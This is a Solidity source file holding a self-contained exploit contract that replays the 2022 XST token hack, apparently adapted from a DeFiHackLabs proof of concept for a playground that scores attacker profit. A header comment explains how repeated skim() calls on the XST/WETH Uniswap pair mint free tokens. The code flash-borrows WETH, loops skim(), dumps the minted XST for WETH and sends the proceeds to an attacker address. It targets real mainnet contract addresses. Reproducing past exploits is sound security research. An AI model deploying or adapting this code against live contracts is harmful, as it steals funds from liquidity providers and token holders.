// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2022-08-XST).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the flash-swap callback `uniswapV2Call` lives on the test itself, so there is
// no standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit + uniswapV2Call + Refund), so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/XST_exp.sol.
//
// NOTE: the original test ends with `WETH.withdraw(WETHBalance)`. That is OMITTED
// here so the playground can score profit as the attacker's WETH (ERC20) delta —
// the WETH stays in the contract and is forwarded to ATTACKER at the end of the
// callback.
//
// Root cause: XStable2 is an elastic-supply token whose _transfer classifies any
// transfer FROM a registered AMM pool as a "buy" and MINTS new XST. The UniswapV2
// pair's skim() reconciliation calls XST.transfer(pair, balance−reserve) with the
// pair as msg.sender, so each skim(pair) is seen as a buy → mint that leaves the
// pair's balance above the stale reserve0; iterating skim() mints the pool's own
// reserve token geometrically for free. The attacker then dumps that minted XST
// for the pool's WETH at the stale price.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function withdraw(uint256) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function sync() external;
    function skim(address to) external;
}

contract XSTExploit {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant UniswapV20x694f = 0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C; // XST/WETH pair
    address constant XST = 0x91383A15C391c142b80045D8b4730C1c37ac0378;
    address constant UniswapV20x0d4a = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852; // WETH/USDT pair (flash source)
    address constant ATTACKER = 0x00000000000000000000000000000000DeaDBeef;

    function run() external {
        uint256 balance = IERC20(WETH).balanceOf(UniswapV20x694f);
        IUniswapV2Pair(UniswapV20x0d4a).swap(balance * 2, 0, address(this), "0000");
        // forward the WETH profit to the receiver EOA (no withdraw: keep as WETH)
        uint256 weth = IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).transfer(ATTACKER, weth);
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata data) external {
        if (keccak256(data) == keccak256("0000")) {
            uint256 balance = IERC20(WETH).balanceOf(address(this));
            IERC20(WETH).transfer(UniswapV20x694f, balance);
            uint256 uniswapETHBalance = IERC20(WETH).balanceOf(UniswapV20x694f);
            (uint256 amount0Out, uint256 amount1Out,) = IUniswapV2Pair(UniswapV20x694f).getReserves();
            uint256 borrowXST = amount0Out * balance / uniswapETHBalance;
            IUniswapV2Pair(UniswapV20x694f).swap(borrowXST, 0, address(this), "00");
            IUniswapV2Pair(UniswapV20x694f).sync();
            uint256 b1 = IERC20(XST).balanceOf(address(this));
            IERC20(XST).transfer(UniswapV20x694f, b1 / 8);
            for (uint8 i = 0; i < 15; ++i) {
                IUniswapV2Pair(UniswapV20x694f).skim(UniswapV20x694f);
            }
            Refund(amount0);
        }
    }

    function Refund(uint256 amount) internal {
        IUniswapV2Pair(UniswapV20x694f).skim(address(this));
        uint256 nowXSTBalance = IERC20(XST).balanceOf(address(this));
        IERC20(XST).transfer(UniswapV20x694f, nowXSTBalance);
        (uint256 a0Out, uint256 a1Out,) = IUniswapV2Pair(UniswapV20x694f).getReserves();
        uint256 swapAmount = a1Out * 9 / 10;
        IUniswapV2Pair(UniswapV20x694f).swap(0, swapAmount, address(this), "00");
        uint256 v = amount;
        uint256 fee = v * 4 / 1e3;
        uint256 refund = v + fee;
        IERC20(WETH).transfer(UniswapV20x0d4a, refund);
    }

    fallback() external payable {}
}
